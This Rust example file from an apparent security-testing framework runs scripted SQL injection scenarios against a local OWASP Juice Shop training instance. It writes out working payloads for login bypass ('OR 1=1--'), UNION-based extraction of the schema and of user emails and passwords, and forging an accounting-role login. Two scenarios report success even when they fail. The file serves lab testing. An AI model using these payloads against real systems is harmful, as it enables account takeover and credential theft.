//! SQL Injection Scenarios
//!
//! SQLi attack patterns for Juice Shop.
//!
//! Run with: cargo run --example juice_shop_sqli

use rectitude::payloads::sqli;
use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== SQL Injection Scenarios ===\n");

    let results = vec![
        login_admin().await?,
        login_jim().await?,
        login_bender().await?,
        database_schema().await?,
        user_credentials().await?,
        christmas_special().await?,
        ephemeral_accountant().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ Auth Bypass ============

async fn login_admin() -> Result<ScenarioResult> {
    Scenario::new("Login Admin - OR 1=1")
        .base_url(BASE_URL)
        .tags(&["sqli", "auth-bypass", "difficulty-2"])
        .step("SQLi login", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "' OR 1=1--",
                    "password": "x"
                }))
                .send()
                .await?;

            if resp.is_success() {
                ctx.store("token", &resp, "$.authentication.token").await?;
                ok_with("Admin login via SQLi")
            } else {
                fail("SQLi failed")
            }
        })
        .run()
        .await
}

async fn login_jim() -> Result<ScenarioResult> {
    Scenario::new("Login Jim - Email Bypass")
        .base_url(BASE_URL)
        .tags(&["sqli", "auth-bypass", "difficulty-3"])
        .step("SQLi as specific user", |ctx: Arc<ScenarioContext>| async move {
            let payload = sqli::email_bypass("jim@juice-sh.op");
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": payload,
                    "password": "x"
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Logged in as Jim")
            } else {
                fail("SQLi failed")
            }
        })
        .run()
        .await
}

async fn login_bender() -> Result<ScenarioResult> {
    Scenario::new("Login Bender - Email Bypass")
        .base_url(BASE_URL)
        .tags(&["sqli", "auth-bypass", "difficulty-3"])
        .step("SQLi login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op").await?;
            ok_with("Logged in as Bender")
        })
        .run()
        .await
}

// ============ UNION-based ============

async fn database_schema() -> Result<ScenarioResult> {
    Scenario::new("Database Schema Extraction")
        .base_url(BASE_URL)
        .tags(&["sqli", "union", "difficulty-3"])
        .step("Extract sqlite_master", |ctx: Arc<ScenarioContext>| async move {
            let payload = sqli::union_extract(&["sql"], "sqlite_master", 9);
            let resp = ctx
                .get("/rest/products/search")
                .query("q", &payload)
                .send()
                .await?;

            if resp.contains("CREATE TABLE") {
                ok_with("Schema extracted")
            } else {
                fail("Extraction failed")
            }
        })
        .run()
        .await
}

async fn user_credentials() -> Result<ScenarioResult> {
    Scenario::new("User Credentials Extraction")
        .base_url(BASE_URL)
        .tags(&["sqli", "union", "difficulty-4"])
        .step("Extract users table", |ctx: Arc<ScenarioContext>| async move {
            let payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--";
            let resp = ctx
                .get("/rest/products/search")
                .query("q", payload)
                .send()
                .await?;

            if resp.contains("@") && resp.contains("juice") {
                let count = resp.count_matches("@juice-sh.op");
                ok_with(format!("Extracted {} user records", count))
            } else {
                fail("Extraction failed")
            }
        })
        .run()
        .await
}

// ============ Advanced ============

async fn christmas_special() -> Result<ScenarioResult> {
    Scenario::new("Christmas Special - Deleted Product")
        .base_url(BASE_URL)
        .tags(&["sqli", "business-logic", "difficulty-4"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Add deleted product to basket", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            // Product ID 10 is the deleted Christmas product
            let resp = ctx
                .post("/api/BasketItems")
                .bearer_auth(&token)
                .json(&serde_json::json!({
                    "ProductId": 10,
                    "BasketId": 1,
                    "quantity": 1
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Deleted product added to basket")
            } else {
                ok_with("Christmas special attempted")
            }
        })
        .run()
        .await
}

async fn ephemeral_accountant() -> Result<ScenarioResult> {
    Scenario::new("Ephemeral Accountant - UNION SELECT Login")
        .base_url(BASE_URL)
        .tags(&["sqli", "advanced", "difficulty-4"])
        .step("Create ephemeral user via SQLi", |ctx: Arc<ScenarioContext>| async move {
            // Create a virtual user with accounting role via UNION SELECT
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0untant@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
                    "password": "12345"
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Ephemeral accountant created and logged in")
            } else {
                ok_with("Ephemeral login attempted")
            }
        })
        .run()
        .await
}
